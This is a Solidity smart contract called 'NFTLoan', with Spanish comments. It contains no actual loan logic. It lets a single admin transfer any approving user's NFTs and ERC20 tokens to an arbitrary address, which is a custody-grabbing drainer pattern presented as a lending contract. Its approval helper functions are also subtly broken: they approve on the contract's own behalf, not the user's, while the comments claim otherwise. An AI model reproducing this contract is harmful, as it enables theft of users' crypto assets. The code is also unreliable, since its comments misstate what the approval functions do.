// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC721 {
    function transferFrom(address from, address to, uint256 tokenId) external;
    function setApprovalForAll(address operator, bool approved) external;
    function isApprovedForAll(address owner, address operator) external view returns (bool);
}

interface IERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract NFTLoan {
    address public admin;

    // Evento para registrar cuando se otorgan aprobaciones
    event NFTsApproved(address indexed owner, address[] nftContracts);
    event TokensApproved(address indexed owner, address tokenContract, uint256 amount);

    // Evento para registrar la transferencia de NFTs
    event NFTTransferred(address indexed from, address indexed to, uint256 nftId, address nftContract);

    // Evento para registrar la transferencia de tokens
    event TokensTransferred(address indexed from, address indexed to, address tokenContract, uint256 amount);

    // El constructor inicializa al administrador
    constructor() {
        admin = msg.sender;
    }

    // Modificador para restringir acceso solo al administrador (propietario del contrato)
    modifier onlyAdmin() {
        require(msg.sender == admin, "Solo el administrador puede ejecutar esta funcion");
        _;
    }

    // El usuario otorga permiso al contrato para transferir múltiples NFTs de diferentes contratos
    function approveContractToTransferMultipleNFTs(address[] calldata _nftContracts) external {
        require(_nftContracts.length > 0, "Debe aprobar al menos un contrato");

        // Itera a través de la lista de contratos NFT y otorga la aprobación a cada uno
        for (uint256 i = 0; i < _nftContracts.length; i++) {
            IERC721(_nftContracts[i]).setApprovalForAll(address(this), true); // El usuario concede permisos al contrato
        }

        // Emitir evento para registrar las aprobaciones
        emit NFTsApproved(msg.sender, _nftContracts);
    }

    // Verifica si el contrato tiene permisos para transferir NFTs de múltiples contratos
    function hasApprovalForAll(address[] calldata _nftContracts, address owner) external view returns (bool[] memory) {
        bool[] memory approvals = new bool[](_nftContracts.length);

        // Iterar sobre los contratos de NFT y verificar si el usuario ha aprobado a este contrato para cada uno
        for (uint256 i = 0; i < _nftContracts.length; i++) {
            approvals[i] = IERC721(_nftContracts[i]).isApprovedForAll(owner, address(this));
        }

        return approvals;
    }

    // Función que solo el administrador puede usar para transferir NFTs de un usuario a una dirección específica
    function transferNFTs(address user, address to, address[] calldata _nftContracts, uint256[] calldata _nftIds) external onlyAdmin {
        require(_nftContracts.length == _nftIds.length, "El numero de contratos y IDs debe coincidir");
        require(_nftContracts.length > 0, "Debe transferir al menos un NFT");

        // Iterar sobre los contratos e IDs de NFT y transferirlos
        for (uint256 i = 0; i < _nftContracts.length; i++) {
            require(IERC721(_nftContracts[i]).isApprovedForAll(user, address(this)), "No autorizado para transferir NFTs");
            
            // Transferir el NFT desde el usuario al destinatario
            IERC721(_nftContracts[i]).transferFrom(user, to, _nftIds[i]);

            // Emitir evento para registrar la transferencia
            emit NFTTransferred(user, to, _nftIds[i], _nftContracts[i]);
        }
    }

    // El usuario otorga permiso al contrato para transferir tokens ERC20 de una dirección
    function approveContractToTransferTokens(address tokenContract, uint256 amount) external {
        require(amount > 0, "El monto debe ser mayor que cero");
        IERC20(tokenContract).approve(address(this), amount); // El usuario concede permisos al contrato

        // Emitir evento para registrar la aprobación de tokens
        emit TokensApproved(msg.sender, tokenContract, amount);
    }

    // Función que solo el administrador puede usar para transferir tokens ERC20 de un usuario a una dirección específica
    function transferTokens(address user, address to, address tokenContract, uint256 amount) external onlyAdmin {
        require(amount > 0, "El monto debe ser mayor que cero");

        // Verificar que el contrato tenga la aprobación suficiente para transferir los tokens
        uint256 allowance = IERC20(tokenContract).allowance(user, address(this));
        require(allowance >= amount, "Permiso insuficiente para transferir tokens");

        // Transferir los tokens del usuario al destinatario
        IERC20(tokenContract).transferFrom(user, to, amount);

        // Emitir evento para registrar la transferencia de tokens
        emit TokensTransferred(user, to, tokenContract, amount);
    }

    // Función para cambiar el administrador del contrato (solo puede ser llamado por el actual admin)
    function changeAdmin(address newAdmin) external onlyAdmin {
        require(newAdmin != address(0), "El nuevo administrador no puede ser la direccion cero");
        admin = newAdmin;
    }
}
